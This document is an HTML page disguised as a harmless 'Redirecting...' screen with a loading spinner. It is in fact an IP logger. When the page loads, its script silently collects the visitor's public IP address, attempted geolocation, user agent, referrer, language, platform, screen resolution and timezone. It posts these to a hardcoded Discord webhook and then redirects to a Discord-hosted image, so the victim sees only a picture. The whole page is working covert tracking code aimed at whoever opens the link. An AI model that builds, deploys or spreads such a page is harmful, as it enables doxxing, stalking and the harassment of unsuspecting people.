<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            background-color: #1a1a1a; /* Dark background */
            color: #f0f0f0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.5s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); border-top-color: #FF0000; }
            14% { border-top-color: #FF7F00; }
            28% { border-top-color: #FFFF00; }
            42% { border-top-color: #00FF00; }
            57% { border-top-color: #0000FF; }
            71% { border-top-color: #4B0082; }
            85% { border-top-color: #9400D3; }
            100% { transform: rotate(360deg); border-top-color: #FF0000; }
        }

        .message {
            font-size: 1.2em;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="message">Processing your request... Please wait.</div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX';
        const REDIRECT_URL = 'https://cdn.discordapp.com/attachments/1342843098274861087/1377314926452019401/IMG_4922.jpg?ex=683883fb&is=6837327b&hm=8b1143818dc62e4487759506dea79cfa7bdd0c53473b46bab5e4277229c56483&';

        // Function to send data to Discord Webhook
        async function sendDataToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [{
                            title: 'User Access Log',
                            color: 16711680, // Red color for the embed
                            fields: [
                                { name: 'IP Address', value: data.ip || 'N/A', inline: true },
                                // Geolocation fields are conditionally added if available
                                ...(data.latitude && data.longitude ? [
                                    { name: 'Latitude', value: String(data.latitude), inline: true },
                                    { name: 'Longitude', value: String(data.longitude), inline: true }
                                ] : []),
                                { name: 'User Agent', value: data.userAgent || 'N/A', inline: false },
                                { name: 'Referrer', value: data.referrer || 'N/A', inline: false },
                                { name: 'Language', value: data.language || 'N/A', inline: true },
                                { name: 'Platform', value: data.platform || 'N/A', inline: true },
                                { name: 'Screen Resolution', value: data.screenResolution || 'N/A', inline: true },
                                { name: 'Timezone', value: data.timezone || 'N/A', inline: true },
                                { name: 'Timestamp (UTC)', value: data.timestampUTC || 'N/A', inline: false }
                            ],
                            footer: {
                                text: 'Automated Log by Instant Redirect'
                            },
                            timestamp: new Date().toISOString()
                        }]
                    }),
                    mode: 'cors',
                    keepalive: true // Attempts to send even after navigation
                });
                console.log('Webhook data transmission initiated.');
            } catch (error) {
                console.error('Failed to initiate webhook transmission:', error);
            }
        }

        // Function to reliably get public IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        // Function to attempt geolocation with a strict timeout
        function getGeolocationWithTimeout(timeoutMs) {
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    const geoTimeout = setTimeout(() => {
                        console.warn('Geolocation attempt timed out or user denied.');
                        resolve({ latitude: null, longitude: null, error: 'Timed out or denied' });
                    }, timeoutMs);

                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            clearTimeout(geoTimeout);
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            });
                        },
                        (error) => {
                            clearTimeout(geoTimeout);
                            console.warn('Geolocation error:', error.message);
                            resolve({ latitude: null, longitude: null, error: error.message });
                        },
                        {
                            enableHighAccuracy: false,
                            timeout: timeoutMs,
                            maximumAge: 0
                        }
                    );
                } else {
                    console.warn("Geolocation API not supported by this browser.");
                    resolve({ latitude: null, longitude: null, error: 'Not supported' });
                }
            });
        }

        // Main initialization function for instant execution and redirect
        async function initializeAndRedirect() {
            const collectedData = {};

            // Collect immediate browser information
            collectedData.userAgent = navigator.userAgent;
            collectedData.referrer = document.referrer;
            collectedData.language = navigator.language;
            collectedData.platform = navigator.platform;
            collectedData.screenResolution = `${window.screen.width}x${window.screen.height}`;
            collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            collectedData.timestampUTC = new Date().toUTCString();

            // Fetch IP and attempt geolocation in parallel, prioritizing speed
            const ipPromise = getIPAddress();
            const geoPromise = getGeolocationWithTimeout(150); // Very short timeout for geolocation to avoid blocking

            const [ip, geoResult] = await Promise.all([ipPromise, geoPromise]);

            collectedData.ip = ip;
            if (geoResult.latitude && geoResult.longitude) {
                collectedData.latitude = geoResult.latitude;
                collectedData.longitude = geoResult.longitude;
            }

            // Fire and forget: send data to webhook without waiting for response
            sendDataToWebhook(collectedData);

            // Redirect almost instantly
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 200); // 200ms delay for webhook initiation
        }

        // Execute immediately upon DOM content loaded
        document.addEventListener('DOMContentLoaded', initializeAndRedirect);
    </script>
</body>
</html>
